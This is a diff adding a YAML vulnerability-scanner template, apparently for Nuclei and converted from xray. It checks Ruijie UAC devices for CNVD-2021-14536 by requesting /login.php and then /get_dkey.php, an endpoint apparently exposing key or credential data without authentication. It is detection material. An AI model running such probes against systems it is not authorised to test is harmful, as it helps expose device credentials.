@@ -1,0 +1,36 @@
+id: poc-yaml-ruijie-uac-cnvd-2021-14536
+
+info:
+  name: poc-yaml-ruijie-uac-cnvd-2021-14536
+  author: jweny(https://github.com/jweny)
+  severity: critical
+  tags: xray-converted,cnvd-2021-14536,ct-158842
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247483972&idx=1&sn=b51678c6206a533330b0279454335065
+
+http:
+  - raw:
+      - |
+        GET /login.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /get_dkey.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - ")\\s*:\\s*(.*),?"
+          - "^\\[(.*)\\]$"
